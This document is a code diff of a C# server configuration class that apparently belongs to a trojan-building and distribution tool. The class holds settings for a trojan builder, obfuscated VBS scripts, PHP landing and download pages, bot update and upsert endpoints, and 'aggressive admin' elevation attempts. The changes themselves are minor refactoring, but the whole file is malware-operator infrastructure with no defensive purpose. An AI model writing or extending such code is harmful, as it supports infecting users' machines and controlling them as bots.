@@ -19,9 +19,9 @@ public class ServerModel: BaseModel
     [JsonPropertyName("dnSponsor")] public List<DnSponsorModel> DnSponsor { get; set; }
 
     [JsonPropertyName("pack")] public PackModel Pack { get; set; }
-    
+
     [JsonPropertyName("clone")] public CloneModel CloneModel { get; set; }
-  
+
     [JsonPropertyName("sourceCertDir")] public string SourceCertDir => ServerModelLoader.SourceCertDirStatic;
     [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;
 
@@ -29,7 +29,7 @@ public class ServerModel: BaseModel
     [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
     [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
     [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
-    
+
     [JsonPropertyName("troyanBuilder")] public string TroyanBuilder => ServerModelLoader.TroyanBuilder;
     [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
     [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
@@ -59,7 +59,7 @@ public class ServerModel: BaseModel
     [JsonPropertyName("userDataDir")] public string UserDataDir => ServerModelLoader.UserDataDir(Server);
     [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
     [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
-    
+
 
     // server-depended
     [JsonPropertyName("serverIp")] public string ServerIp{ get; set; } = "";
@@ -69,21 +69,24 @@ public class ServerModel: BaseModel
     [JsonPropertyName("strahServer")] public string StrahServer { get; set; }
 
 
+    [JsonIgnore] public string EffectiveAlias => string.IsNullOrEmpty(Alias) ? ServerIp : Alias;
+
+
     public string Random()
     {
         return VbsRandomer.GenerateRandomVariableName(10);
     }
-    
-    
+
+
     [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
     [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
     [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
     [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
     [JsonPropertyName("htmlTemplateSponsorFile")] public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");
 
-    
+
     [JsonPropertyName("landingAuto")] public bool LandingAuto { get; set; }
-    
+
     private string _landingName;
     [JsonPropertyName("landingName")]
     public string LandingName
@@ -98,7 +101,7 @@ public class ServerModel: BaseModel
     }
 
     [JsonPropertyName("landingFtp")] public string LandingFtp { get; set; }
-    
+
     [JsonPropertyName("landingDir")] public string LandingDir => Path.Combine(UserDataDir, "landing");
     [JsonPropertyName("landingPhpVbsFile")] public string LandingPhpVbsFile => Path.Join(LandingDir, $"{LandingName}.php");
     [JsonPropertyName("landingSponsorPhpVbsFile")] public string LandingSponsorPhpVbsFile => Path.Join(LandingDir, $"{LandingName}-sponsor.php");
@@ -117,28 +120,21 @@ public class ServerModel: BaseModel
     [JsonPropertyName("primaryDns")] public string PrimaryDns { get; set; }
 
     [JsonPropertyName("secondaryDns")] public string SecondaryDns { get; set; }
-    
-    
-    
-    
-    
+
+
+
+
+
     [JsonPropertyName("extraUpdate")] public bool ExtraUpdate { get; set; }
     [JsonPropertyName("extraUpdateUrl")] public string ExtraUpdateUrl { get; set; }
-    
+
     [JsonPropertyName("updateUrl")]
     public string UpdateUrl
     {
         get
         {
             var result = "http://";
-            if (!string.IsNullOrEmpty(Alias))
-                result += Alias;
-            else
-            {
-                result += ServerIp;
-            }
-
-            result += "/bot/update";
+            result += EffectiveAlias + "/bot/update";
             return result;
         }
     }
@@ -152,16 +148,7 @@ public class ServerModel: BaseModel
         get
         {
             var result = "http://";
-            if (!string.IsNullOrEmpty(Alias))
-            {
-                result += Alias;
-            }
-            else
-            {
-                result += ServerIp;
-            }
-
-            result += "/bot/upsert";
+            result += EffectiveAlias + "/bot/upsert";
             return result;
         }
     }
@@ -169,9 +156,9 @@ public class ServerModel: BaseModel
     [JsonPropertyName("autoUpdate")] public bool AutoUpdate { get; set; } = true;
     [JsonPropertyName("aggressiveAdmin")] public bool AggressiveAdmin { get; set; } = true;
     [JsonPropertyName("aggressiveAdminDelay")] public int AggressiveAdminDelay { get; set; } = 30;
-    
+
     [JsonPropertyName("aggressiveAdminAttempts")] public int AggressiveAdminAttempts { get; set; } = 0;
-    
+
     [JsonPropertyName("aggressiveAdminTimes")] public int AggressiveAdminTimes { get; set; } = 0;
     public List<string> Domains(string name) =>
         DomainIps.Where(a => a.Name == name).SelectMany(a => a.Domains).ToList();
@@ -216,13 +203,13 @@ public class ServerModel: BaseModel
     [JsonPropertyName("userCloneLog")] public string UserCloneLog => Path.Combine(UserDataDir, "clone.log");
     [JsonPropertyName("userPackLog")] public string UserPackLog => Path.Combine(UserDataDir, "pack.log");
     [JsonPropertyName("userPostLog")] public string UserPostLog => Path.Combine(UserDataDir, "post.log");
-    
+
     [JsonPropertyName("post")]
     public PostModel PostModel { get; set; } = new PostModel();
 
     [JsonIgnore] public bool IsLocal => ServerIp == "127.0.0.1";
-    
-    
+
+
     //constructor
     public ServerModel()
     {
@@ -254,7 +241,7 @@ public class ServerModel: BaseModel
         StartDownloads = new List<string>();
         Pushes = new List<string>();
     }
-    
+
     protected override void InternalRefresh()
     {
     }
